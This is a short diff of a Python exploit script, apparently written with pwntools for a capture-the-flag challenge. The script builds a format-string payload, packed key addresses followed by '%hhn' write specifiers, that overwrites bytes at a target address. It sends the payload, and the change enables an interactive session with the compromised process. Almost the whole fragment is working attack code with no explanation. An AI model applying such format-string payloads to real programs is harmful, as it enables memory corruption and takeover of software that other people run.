@@ -14,7 +14,7 @@ def pwn():
     # pause()
     payload = p32(key_address)+p32(key_address+1)+" %.43x%7$hhn"+" %.221x%8$hhn"
     p.sendline(payload)
-    # p.interactive()
+    p.interactive()
 
 if __name__ == "__main__":
     pwn()
